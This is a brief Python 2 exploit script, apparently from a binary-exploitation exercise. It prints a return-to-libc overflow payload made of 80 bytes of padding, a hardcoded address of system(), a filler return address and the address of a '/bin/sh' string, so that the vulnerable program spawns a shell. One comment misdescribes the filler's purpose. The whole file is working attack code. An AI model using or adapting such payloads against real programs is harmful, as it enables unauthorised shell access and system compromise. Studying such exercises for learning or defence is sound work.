import struct


###padding for adjusting the buffer
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"

### calling System
system = struct.pack("I", 0xb7ecffb0)

### Before calling /bin/sh we need to make a seg fault to hold the system
af_ret = "AAAA"

### /bin/sh 
bash = struct.pack("I", 0xb7fb63bf)

print padding + system + af_ret +bash

